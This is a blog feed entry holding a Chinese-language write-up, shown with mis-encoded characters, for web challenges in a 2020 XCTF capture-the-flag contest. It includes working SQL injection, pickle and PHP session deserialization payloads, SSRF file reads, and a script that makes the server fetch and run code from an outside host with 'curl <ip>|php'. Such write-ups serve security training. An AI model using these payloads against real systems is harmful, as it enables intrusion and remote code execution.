      <link href="/2020/03/10/xctf%E9%AB%98%E6%A0%A1%E6%8A%97%E7%96%AB/"/>
      <url>/2020/03/10/xctf%E9%AB%98%E6%A0%A1%E6%8A%97%E7%96%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="é«˜æ ¡æˆ˜ç–«"><a href="#é«˜æ ¡æˆ˜ç–«" class="headerlink" title="é«˜æ ¡æˆ˜ç–«"></a>é«˜æ ¡æˆ˜ç–«</h1><p>æ‰“å®Œè¿™æ¬¡æ¯”èµ›,æˆ‘å†æ¬¡è®¤æ¸…äº†è‡ªå·±æ˜¯ä¸ªå‘å¾®çš„é€’èŒ¶å°å¼Ÿâ€¦</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a><strong>easy_trick_gzmtu</strong></h3><pre><code>2020\\%27 2002020%27 5002020\%27 500</code></pre><p>å¯èƒ½ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²æˆ–è€…è¿‡æ»¤<code>\</code> ?,ç»§ç»­æµ‹è¯•</p><pre><code>http://121.37.181.246:6333/?time=2020&#39; or 1%23  =&gt;500http://121.37.181.246:6333/?time=2020or&#39;%23 =&gt;æ— ç»“æœ,è¯´æ˜ä¸æ˜¯è¿‡æ»¤orhttp://121.37.181.246:6333/?time=2020&#39;%23or=&gt;æ²¡æœ‰500,è¯´æ˜orä¸åœ¨é»‘åå•ä¸­ </code></pre><pre><code>/?time=2020%27%20||1=1%20--+    è¿”å›æ­£ç¡®ç»“æœ/?time=2020%27%20or1=1%20--+   and   &amp;&amp;éƒ½é¡µé¢æŠ¥é”™/?time=-1%27%20||1=0%20--+   é¡µé¢çš„hello worldæ¶ˆå¤±ï¼Œåº”è¯¥å­˜åœ¨å¸ƒå°”ç›²æ³¨</code></pre><pre><code>?time=0&#39;||\i\f(\s\l\e\e\p(2),1,1)%23æˆåŠŸæ‰§è¡Œ,è¯´æ˜æ˜¯è¿‡æ»¤\</code></pre><pre><code class="python">import requests,resql=&quot;union select 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata&quot;#sql=&quot;union select 1,GROUP_CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,passwd,&#39;,&#39;,url,&#39;,&#39;),3 FROM admin&quot;#admin,content#admin#id,username,passwd,url#0,admin,20200202goodluck,/eGlhb2xldW5n,tmp=&quot;&quot;for i in sql:    if i.isalpha():        tmp+=&quot;\\&quot;+i        #print(&quot;\\&quot;+i,end=&quot;&quot;)    else:        tmp+=i        #print(i,end=&quot;&quot;)tmp=&quot;http://121.37.181.246:6333/?time=0&#39;+{}%23&quot;.format(tmp)res=requests.get(tmp)result=re.search(r&#39;&lt;div class=&quot;text-c &quot;&gt;(.*)&lt;/div&gt;&#39;,res.text)print(result.group(1))</code></pre><p>æ‹¿åˆ°åå°åœ°å€å’Œç®¡ç†å‘˜è´¦å·</p><pre><code>http://121.37.181.246:6333/eGlhb2xldW5nadmin,20200202goodluck</code></pre><pre><code>http://121.37.181.246:6333/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.phphttp://121.37.181.246:6333/eGlhb2xldW5n/check.phphttp://121.37.181.246:6333/eGlhb2xldW5n/index.php</code></pre><p>phpç‰ˆæœ¬5.5.9,%00æˆªæ–­</p><p>check.phpä¸­å¯ä»¥è¯»å–æ–‡ä»¶ä½†æ˜¯éœ€è¦æœ¬åœ°è®¿é—®</p><pre><code>Host: 127.0.0.1X-Forwarded-For: 127.0.0.1Client-Ip: 127.0.0.1Referer: http://127.0.0.1/eGlhb2xldW5n/check.php</code></pre><pre><code>æ²¡æœ‰ç”¨eGlhb2xldW5nLnBocA==:xiaoleung.phpeGlhb2xldW5n:xiaoleungæ³¨é‡Šé‡Œç»™çš„:eGlhb2xldW5nLnBocA==.phpå¯èƒ½æ˜¯çªç ´çš„å…³é”®,ä½†æ˜¯é‡Œé¢å•¥éƒ½æ²¡æœ‰å¯¹eGlhb2xldW5nLnBocA==.phpè¿›è¡Œå‚æ•°çˆ†ç ´,ä¹Ÿæ²¡ç»“æœ</code></pre><p>å­˜åœ¨httpè¯·æ±‚èµ°ç§</p><pre><code>GET /eGlhb2xldW5n/check.php?url=fuck&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1Host: 121.37.181.246:6333X-Forwarded-For: 127.0.0.1Client-Ip: 127.0.0.1Cookie: PHPSESSID=9gkhjmmmp6ctmnn2578n3hcth1GET /eGlhb2xldW5n/check.php?url=fuck&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1Host: localhostX-Forwarded-For: 127.0.0.1Client-Ip: 127.0.0.1Cookie: PHPSESSID=9gkhjmmmp6ctmnn2578n3hcth1</code></pre><p>æœ€åå­¦é•¿è·Ÿæˆ‘è¯´è¿™é‡Œæœ¬åœ°è®¿é—®çš„æ„æ€æ˜¯urlä¸­çš„ipåœ°å€è¦ä¸º127.0.0.1â€¦â€¦..æ— è¯­</p><p>GET /eGlhb2xldW5n/check.php?url=file://localhost/var/www/html/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1</p><pre><code class="php">&lt;?phpclass trick{    public $gf;    public function content_to_file($content){            $passwd = $_GET[&#39;pass&#39;];        if(preg_match(&#39;/^[a-z]+\.passwd$/m&#39;,$passwd))     {         if(strpos($passwd,&quot;20200202&quot;)){            echo file_get_contents(&quot;/&quot;.$content);        }         }         }    public function aiisc_to_chr($number){        if(strlen($number)&gt;2){        $str = &quot;&quot;;         $number = str_split($number,2);         foreach ($number as $num ) {             $str = $str .chr($num);         }         return strtolower($str);        }        return chr($number);    }    public function calc(){        $gf=$this-&gt;gf;        if(!preg_match(&#39;/[a-zA-z0-9]|\&amp;|\^|#|\$|%/&#39;, $gf)){              eval(&#39;$content=&#39;.$gf.&#39;;&#39;);              $content =  $this-&gt;aiisc_to_chr($content);               return $content;        }    }    public function __destruct(){        $this-&gt;content_to_file($this-&gt;calc());    }}unserialize((base64_decode($_GET[&#39;code&#39;])));?&gt;</code></pre><p>æˆ‘ä»¬è¦é€»è¾‘è¿ç®—ç¬¦éæ¥ç»•è¿‡<code>preg_match(&#39;/[a-zA-z0-9]|\&amp;|\^|#|\$|%/&#39;, $gf)</code></p><pre><code class="http">GET /eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php?pass=aaa.passwd%0a20200202&amp;code=Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czoxMToifiLIz8jJycrIziIiO30%3DD HTTP/1.1</code></pre><h3 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h3><pre><code class="python">import base64import ioimport sysimport picklefrom flask import Flask, Response, render_template, requestimport secretapp = Flask(__name__)class Animal:    def __init__(self, name, category):        self.name = name        self.category = category    def __repr__(self):        return f&#39;Animal(name={self.name!r}, category={self.category!r})&#39;    def __eq__(self, other):        return type(other) is Animal and self.name == other.name and self.category == other.categoryclass RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module == &#39;__main__&#39;:            return getattr(sys.modules[&#39;__main__&#39;], name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))def restricted_loads(s):    return RestrictedUnpickler(io.BytesIO(s)).load()def read(filename, encoding=&#39;utf-8&#39;):    with open(filename, &#39;r&#39;, encoding=encoding) as fin:        return fin.read()@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def index():    if request.args.get(&#39;source&#39;):        return Response(read(__file__), mimetype=&#39;text/plain&#39;)    if request.method == &#39;POST&#39;:        try:            pickle_data = request.form.get(&#39;data&#39;)            if b&#39;R&#39; in base64.b64decode(pickle_data):                return &#39;No... I don\&#39;t like R-things. No Rabits, Rats, Roosters or RCEs.&#39;            else:                result = restricted_loads(base64.b64decode(pickle_data))                if type(result) is not Animal:                    return &#39;Are you sure that is an animal???&#39;            correct = (result == Animal(secret.name, secret.category))            return render_template(&#39;unpickle_result.html&#39;, result=result, pickle_data=pickle_data, giveflag=correct)        except Exception as e:            print(repr(e))            return &quot;Something wrong&quot;    sample_obj = Animal(&#39;ä¸€ç»™æˆ‘å“©giaogiao&#39;, &#39;Giao&#39;)    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()    return render_template(&#39;unpickle_page.html&#39;, sample_obj=sample_obj, pickle_data=pickle_data)if __name__ == &#39;__main__&#39;:    app.run(host=&#39;0.0.0.0&#39;, port=5000)</code></pre><p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–çš„å†…å®¹</p><p>ä½†æ˜¯ååºåˆ—åŒ–è¿˜æœ‰é™åˆ¶:</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module == &#39;__main__&#39;:            return getattr(sys.modules[&#39;__main__&#39;], name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))def restricted_loads(s):    return RestrictedUnpickler(io.BytesIO(s)).load()</code></pre><p>åªèƒ½å†<code>__main__</code>ä¸­å¯»æ‰¾å±æ€§,è¿™æ ·æˆ‘ä»¬ä¹Ÿå°±æ— æ³•ç›´æ¥è¯»å–secreté‡Œçš„å†…å®¹äº†</p><p>å…³é”®:</p><p><code>return render_template(&#39;unpickle_result.html&#39;, result=result, pickle_data=pickle_data, giveflag=correct)</code></p><p>ä¸çŸ¥é“æ˜¯<code>correct!=False</code>ç»™flagè¿˜æ˜¯<code>correct==True</code>ç»™flag</p><p>å†³å®šcorrectçš„æ˜¯:<code>correct = (result == Animal(secret.name, secret.category))</code></p><p>ä¼šè°ƒç”¨<code>Animalçš„__eq__</code>æˆ‘ä»¬å¯ä»¥ä»¤<code>__eq__</code>ç­‰äºå…¶ä»–çš„å‡½æ•°æ¥ç»•è¿‡,ä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„ä¸¤ä¸ªå‚æ•°çš„å‡½æ•°</p><p>åæ¥å‘ç°<code>Animal(secret.name, secret.category)</code>æ˜¯åœ¨ååºåˆ—åŒ–ä¹‹åæ‰§è¡Œçš„,å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹secret,é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ç»“æœ</p><p>payload:</p><pre><code class="python">import pickleimport base64p=b&#39;&#39;&#39;c__main__secret(S&#39;name&#39;S&#39;test&#39;S&#39;category&#39;S&#39;test&#39;db&#39;&#39;&#39;+pickle.loads(Animal(&quot;test&quot;,&quot;test&quot;))print(base64.b64encode(p))</code></pre><p><code>flag{409ed945-5b77-4ec3-97e1-b395778842ba}</code></p><h3 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h3><p>begin é‚£é‡Œæä¸ª %s% å°±è¡Œäº†ã€‚</p><p>8080 å‡ºä¸œè¥¿äº†</p><pre><code>Welcome to our FMKQ api, you could use the help information belowTo read file:    /read/file=example&amp;vipcode=example    if you are not vip,let vipcode=0,and you can only read /tmp/{file}Other functions only for the vip!!!</code></pre><pre><code>http://121.37.179.47:1101/?begin=%s%&amp;head=\&amp;url=http://127.0.0.1:8080/read/file=/tmp/flag%26vipcode=1</code></pre><p>flagåœ¨ /æœªçŸ¥ç›®å½•/flagã€‚è‡³å°‘èƒ½æ‰«ç›®å½•ï¼Œæˆ–è€…ç›´æ¥ getshell</p><p><img src="https://i.loli.net/2020/03/08/qlPynLj3IOkZu9A.png" alt="image7052"></p><p>åœ¨fuzzè¿‡ç¨‹ä¸­æœ‰ä¸€ä¸‹æŠ¥é”™</p><pre><code>Absolute URI not allowed if server is not a proxy.Malformed Request-Line: bad protocolMalformed Request-URI</code></pre><p>å»ç½‘ä¸ŠæŸ¥äº†ä¸‹å¯èƒ½æ˜¯cherrypy</p><p>å½“è¾“å…¥{file}æ—¶,å…¶å¯¹åº”çš„è¾“å‡ºä¸º:error,è¯´æ˜å¯èƒ½æœ‰sstiæˆ–è€…æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è¯»å–vipcode,ä»è€Œä»»æ„æ–‡ä»¶è¯»å–</p><pre><code>{file.__class__.__init__.__globals__}[&#39;lib&#39;, &#39;media&#39;, &#39;opt&#39;, &#39;var&#39;, &#39;usr&#39;, &#39;mnt&#39;, &#39;bin&#39;, &#39;root&#39;, &#39;home&#39;, &#39;tmp&#39;, &#39;boot&#39;, &#39;sys&#39;, &#39;run&#39;, &#39;sbin&#39;, &#39;srv&#39;, &#39;lib64&#39;, &#39;etc&#39;, &#39;dev&#39;, &#39;proc&#39;, &#39;app&#39;, &#39;.dockerenv&#39;, &#39;fl4g_1s_h3re_u_wi11_rua&#39;]{&#39;truevipcode&#39;: &#39;3Ad8fya45bYeUOFDkJuXpjV1tGHLxzonrCWlER2mPKS9i67w&#39;}&#39;__file__&#39;: &#39;/app/base/readfile.py&#39;</code></pre><pre><code>/?head=\&amp;url=http://127.0.0.1:8080/read/file=/etc/passwd%26vipcode=3Ad8fya45bYeUOFDkJuXpjV1tGHLxzonrCWlER2mPKS9i67w&amp;begin=%s%</code></pre><p>vip.py</p><pre><code class="python">import randomimport stringvipcode = &#39;&#39;class vip:    def __init__(self):        global vipcode        if vipcode == &#39;&#39;:            vipcode = &#39;&#39;.join(random.sample(string.ascii_letters+string.digits, 48))            self.truevipcode = vipcode        else:            self.truevipcode = vipcode    def GetCode(self):        return self.truevipcode</code></pre><p>readfile.py</p><pre><code class="python">from .vip import vipimport reimport osclass File:    def __init__(self,file):        self.file = file    def __str__(self):        return self.file    def GetName(self):        return self.fileclass readfile():    def __str__(self):        filename = self.GetFileName()        if &#39;..&#39; in filename or &#39;proc&#39; in filename:            return &quot;quanbumuda&quot;        else:            try:                file = open(&quot;/tmp/&quot; + filename, &#39;r&#39;)                content = file.read()                file.close()                return content            except:                return &quot;error&quot;    def __init__(self, data):        if re.match(r&#39;file=.*?&amp;vipcode=.*?&#39;,data) != None:            data = data.split(&#39;&amp;&#39;)            data = {                data[0].split(&#39;=&#39;)[0]: data[0].split(&#39;=&#39;)[1],                data[1].split(&#39;=&#39;)[0]: data[1].split(&#39;=&#39;)[1]            }            if &#39;file&#39; in data.keys():                self.file = File(data[&#39;file&#39;])            if &#39;vipcode&#39; in data.keys():                self.vipcode = data[&#39;vipcode&#39;]            self.vip = vip()    def test(self):        if &#39;file&#39; not in dir(self) or &#39;vipcode&#39; not in dir(self) or &#39;vip&#39; not in dir(self):            return False        else:            return True    def isvip(self):        if self.vipcode == self.vip.GetCode():            return True        else:            return False    def GetFileName(self):        return self.file.GetName()current_folder_file = []class vipreadfile():    def __init__(self,readfile):        self.filename = readfile.GetFileName()        self.path = os.path.dirname(os.path.abspath(self.filename))        self.file = File(os.path.basename(os.path.abspath(self.filename)))        global current_folder_file        try:            current_folder_file = os.listdir(self.path)        except:            current_folder_file = current_folder_file    def __str__(self):        if &#39;fl4g&#39; in self.path:            return &#39;nonono,this folder is a secret!!!&#39;        else:            output = &#39;&#39;&#39;Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n&#39;&#39;&#39;            filepath = (self.path + &#39;/{vipfile}&#39;).format(vipfile=self.file)            output += filepath            output += &#39;\r\n\r\nThe content is:\r\n&#39;            try:                f = open(filepath,&#39;r&#39;)                content = f.read()                f.close()            except:                content = &#39;can\&#39;t read&#39;            output += content            output += &#39;\r\n\r\nOther files under the same folder:\r\n&#39;            output += &#39; &#39;.join(current_folder_file)            return output</code></pre><p>app.py</p><pre><code class="python">import webfrom urllib.parse import unquotefrom base.readfile import *urls = (    &#39;/&#39;, &#39;help&#39;,    &#39;/read/(.*)&#39;,&#39;read&#39;)web.config.debug = Falseclass help:    def GET(self):        help_information = &#39;&#39;&#39;        Welcome to our FMKQ api, you could use the help information below        To read file:            /read/file=example&amp;vipcode=example            if you are not vip,let vipcode=0,and you can only read /tmp/{file}        Other functions only for the vip!!!        &#39;&#39;&#39;        return help_informationclass read:    def GET(self,text):        file2read = readfile(text)        if file2read.test() == False:            return &quot;error&quot;        else:            if file2read.isvip() == False:                return (&quot;The content of &quot;+ file2read.GetFileName() +&quot; is {file}&quot;).format(file=file2read)            else:                vipfile2read = vipreadfile(file2read)                return (str(vipfile2read))if __name__ == &quot;__main__&quot;:    app = web.application(urls, globals())    app.run()</code></pre><p>fl4gè¢«è¿‡æ»¤äº†,æ‰€ä»¥æ— æ³•ç›´æ¥è¯»flag</p><p>åˆšå¼€å§‹æ˜¯æƒ³ç”¨fd/cwdæ¥è¯»å–çš„,åæ¥fuzzå‡ ä¸‹æœåŠ¡å°±ç‚¸æ‰äº†,æ‰€ä»¥æˆ‘ä»¬æ¢äº†ä¸ªæ€è·¯</p><p>é€šè¿‡æ‹¼æ¥æ¥ç»•è¿‡</p><pre><code>f{vipfile.__class__.__mro__[1].__new__.__doc__[39]}4g_1s_h3re_u_wi11_rua/flag</code></pre><p>flag{qoSF2nKvwoGRI7aJ}</p><h3 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h3><p>sessionå¼•æ“è®¾ç½®é”™è¯¯å¯¼è‡´çš„ååºåˆ—åŒ–</p><p><code>profile.php</code>å¤„çš„<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p><p>å…¶ä»–åœ°æ–¹åŸºæœ¬éƒ½æ˜¯<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code></p><p>æˆ‘ä»¬åˆ©ç”¨signå‚æ•°æ¥å†™å…¥æ¶æ„session</p><p>æµè§ˆä»£ç å‘ç°,è¿™é‡Œæ˜¯æˆ‘ä»¬çš„ç›®çš„</p><pre><code class="php">&lt;?phprequire_once(&#39;./init.php&#39;);error_reporting(0);if (check_session($_SESSION)) {    #å˜æˆç®¡ç†å‘˜å§ï¼Œå¥¥åˆ©ç»™} else {    die(&#39;åªæœ‰ç®¡ç†å‘˜æ‰èƒ½çœ‹åˆ°æˆ‘å“Ÿ&#39;);}function check_session($session){    foreach ($session as $keys =&gt; $values) {        foreach ($values as $key =&gt; $value) {            if ($key === &#39;admin&#39; &amp;&amp; $value === 1) {                return true;            }        }    }    return false;}</code></pre><p>æˆ‘ä»¬æœ€ç»ˆè¦æ„é€ </p><pre><code class="php">array(    &#39;xxxx&#39;:array(&#39;admin&#39;,1));</code></pre><p>åŸæœ¬æˆ‘ä»¬ç›´æ¥åœ¨<code>upload_sign.php</code>ä¸­post : <code>sigh[admin]=1</code>å³å¯</p><p>ä½†æ˜¯<code>upload_sign.php</code>çš„sessionå¼•æ“æ˜¯<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code></p><p>è€Œ<code>core/index.php</code>çš„sessionå¼•æ“æ˜¯:<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p><p>ä¹Ÿå°±æ˜¯è¯´sessionæ˜¯æ— æ³•è¢«æ­£ç¡®è§£æçš„</p><blockquote><ul><li>php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼</li><li>php_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</li></ul></blockquote><p>æ ¹æ®phpå’Œphp_serializeä¸¤ä¸ªååºåˆ—åŒ–å¼•æ“çš„ä¸åŒä¹‹å¤„,æˆ‘ä»¬æ„é€ </p><p><code>sign=|a%3A1%3A%7Bs%3A5%3A%22admin%22%3Bi%3A1%3B%7D</code></p><p>æ‹¿åˆ°</p><pre><code class="php">require_once(&#39;./init.php&#39;);error_reporting(0);if (check_session($_SESSION)) {    #hint : core/clear.php    $sandbox = &#39;./sandbox/&#39; . md5(&quot;Mrk@1xI^&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    echo $sandbox;    @mkdir($sandbox);    @chdir($sandbox);    if (isset($_POST[&#39;url&#39;])) {        $url = $_POST[&#39;url&#39;];        if (filter_var($url, FILTER_VALIDATE_URL)) {            if (preg_match(&#39;/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i&#39;, $url)) {                echo &quot;you are hacker&quot;;            } else {                $res = parse_url($url);                if (preg_match(&#39;/127\.0\.0\.1$/&#39;, $res[&#39;host&#39;])) {                    $code = file_get_contents($url);                    if (strlen($code) &lt;= 4) {                        @exec($code);                    } else {                        echo &quot;try again&quot;;                    }                }            }        } else {            echo &quot;invalid url&quot;;        }    } else {        highlight_file(__FILE__);    }} else {    die(&#39;åªæœ‰ç®¡ç†å‘˜æ‰èƒ½çœ‹åˆ°æˆ‘å“Ÿ&#39;);}</code></pre><p>ç”¨<code>compress.zlib://data:@127.0.0.1/plain;base64,xxx</code>æ¥ä»£æ›¿dataåè®®</p><pre><code class="python">import random,base64,requestsimport timeshell_ip = &#39;39.108.164.219&#39;# å°†shell_IPè½¬æ¢æˆåå…­è¿›åˆ¶ip = &#39;0x&#39; + &#39;&#39;.join([str(hex(int(i))[2:].zfill(2))                     for i in shell_ip.split(&#39;.&#39;)])# payloadæŸäº›ä½ç½®çš„å¯é€‰å­—ç¬¦pos0 = &#39;f&#39;pos1 = &#39;k&#39;pos2 = &#39;g&#39;  # éšæ„é€‰æ‹©å­—ç¬¦payload = [    &#39;&gt;dir&#39;,    # åˆ›å»ºåä¸º dir çš„æ–‡ä»¶    &#39;&gt;%s\\&gt;&#39; % pos0,    # å‡è®¾pos0é€‰æ‹© f , åˆ›å»ºåä¸º f&gt; çš„æ–‡ä»¶    &#39;&gt;%st-&#39; % pos1,    # å‡è®¾pos1é€‰æ‹© k , åˆ›å»ºåä¸º kt- çš„æ–‡ä»¶,å¿…é¡»åŠ ä¸ªpos1ï¼Œ    # å› ä¸ºalphabeticalåºä¸­t&gt;s    &#39;&gt;sl&#39;,    # åˆ›å»ºåä¸º &gt;sl çš„æ–‡ä»¶ï¼›åˆ°æ­¤å¤„æœ‰å››ä¸ªæ–‡ä»¶ï¼Œ    # ls çš„ç»“æœä¼šæ˜¯ï¼šdir f&gt; kt- sl    &#39;*&gt;v&#39;,    # å‰æ–‡æåˆ°ï¼Œ * ç›¸å½“äº `ls` ï¼Œé‚£ä¹ˆè¿™æ¡å‘½ä»¤ç­‰ä»·äº `dir f&gt; kt- sl`&gt;v ï¼Œ    #  å‰é¢æåˆ°diræ˜¯ä¸æ¢è¡Œçš„ï¼Œæ‰€ä»¥è¿™æ—¶ä¼šåˆ›å»ºæ–‡ä»¶ v å¹¶å†™å…¥ f&gt; kt- sl    # éå¸¸å¥‡å¦™ï¼Œè¿™é‡Œçš„æ–‡ä»¶åæ˜¯ v ï¼Œåªèƒ½æ˜¯v ï¼Œæ²¡æœ‰å¯é€‰å­—ç¬¦    &#39;&gt;rev&#39;,    # åˆ›å»ºåä¸º rev çš„æ–‡ä»¶ï¼Œè¿™æ—¶å½“å‰ç›®å½•ä¸‹ ls çš„ç»“æœæ˜¯ï¼š dir f&gt; kt- rev sl v    &#39;*v&gt;%s&#39; % pos2,    # é­”æ³•å‘ç”Ÿåœ¨è¿™é‡Œï¼š *v ç›¸å½“äº rev v ï¼Œ* çœ‹ä½œé€šé…ç¬¦ã€‚å‰æ–‡ä¹Ÿæè¿‡äº†ï¼Œä½“ä¼šä¸€ä¸‹ã€‚    # è¿™æ—¶pos2æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ g æ–‡ä»¶å†…å®¹æ˜¯æ–‡ä»¶vå†…å®¹çš„åè½¬ï¼š ls -tk &gt; f    # ç»­è¡Œåˆ†å‰² curl 0x11223344|php å¹¶é€†åºå†™å…¥    &#39;&gt;p&#39;,    &#39;&gt;ph\\&#39;,    &#39;&gt;\\|\\&#39;,    &#39;&gt;%s\\&#39; % ip[8:10],    &#39;&gt;%s\\&#39; % ip[6:8],    &#39;&gt;%s\\&#39; % ip[4:6],    &#39;&gt;%s\\&#39; % ip[2:4],    &#39;&gt;%s\\&#39; % ip[0:2],    &#39;&gt;\\ \\&#39;,    &#39;&gt;rl\\&#39;,    &#39;&gt;cu\\&#39;,    &#39;sh &#39; + pos2,    &#39;sh &#39; + pos0,]burp0_url = &quot;http://121.36.222.22:88/core/index.php&quot;burp0_cookies = {&quot;PHPSESSID&quot;: &quot;d0669b0c49bf308022c430b52699b257&quot;, &quot;JSESSIONID&quot;: &quot;E1715942F5CF2C337F1B86D0B6F324E0&quot;}burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Origin&quot;: &quot;http://121.36.222.22:88&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://121.36.222.22:88/core/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}for i in payload:    assert len(i) &lt;= 4    burp0_data = {&quot;url&quot;: &quot;compress.zlib://data:@127.0.0.1/plain;base64,&quot;+str(base64.b64encode(bytes(i,encoding=&quot;ascii&quot;)),encoding=&quot;ascii&quot;)}    r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)    print(r.status_code,burp0_data,i)    print(r.text)    time.sleep(0.1)</code></pre><p><code>flag{B11e_oX4461_Y2h1_100_OIZW4===}</code></p><h3 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h3><p>æœ€ç®€å•çš„é¢˜ç›®ä¹‹ä¸€</p><p>payload:<code>&#39;-&#39;0</code></p><h3 id="php-uaf"><a href="#php-uaf" class="headerlink" title="php-uaf"></a>php-uaf</h3><p><a href="https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener">https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php</a><br>ç›´æ¥includeå°±å¯ä»¥äº†,ä½†æ˜¯æœ‰æ—¶å€™å¯ä»¥,æœ‰æ—¶å€™ä¸å¯ä»¥<br><img src="https://i.loli.net/2020/03/08/Cd7RqZwApre2Lxo.png" alt="image16793"></p><p>flag{SObARsac1TyC0V9B}</p><h3 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h3><p><a href="http://www.zipè·å¾—æºç " target="_blank" rel="noopener">www.zipè·å¾—æºç </a></p><p>åˆ©ç”¨mysql load data æ¥ ååºåˆ—åŒ–</p><pre><code class="php">$phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar,pharä¼ªåè®®ä¸ç”¨pharåç¼€$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new Fileupload(new Listfile(&quot;/;/readflag;&quot;));$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();</code></pre><p><a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server</a></p><p>åˆšå¼€å§‹çš„æ—¶å€™æœ¬åœ°æˆåŠŸæ‰“é€š,ä½†æ˜¯é¶æœºé‚£é‡Œæ€ä¹ˆä¹Ÿæ‰“ä¸é€š</p><p>è‡ªå·±å¼„äº†ä¸ª7.3.15çš„ç¯å¢ƒåå‘ç°</p><p><img src="https://i.loli.net/2020/03/09/9bRVz63Ym7LDNxr.png" alt="image17357"><br>optioné‚£é‡Œè¦æ•°å­—ä¸è¦å­—ç¬¦ä¸²<br>MYSQLI_OPT_LOCAL_INFILEå¯¹åº”çš„æ•°å­—æ˜¯8</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/03/10/xctfé«˜æ ¡æŠ—ç–«/">http://blog.ccreater.top/2020/03/10/xctfé«˜æ ¡æŠ—ç–«/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹2020</title>
      <link href="/2020/02/26/i%E6%98%A5%E7%A7%8B2020/"/>
      <url>/2020/02/26/i%E6%98%A5%E7%A7%8B2020/</url>
      
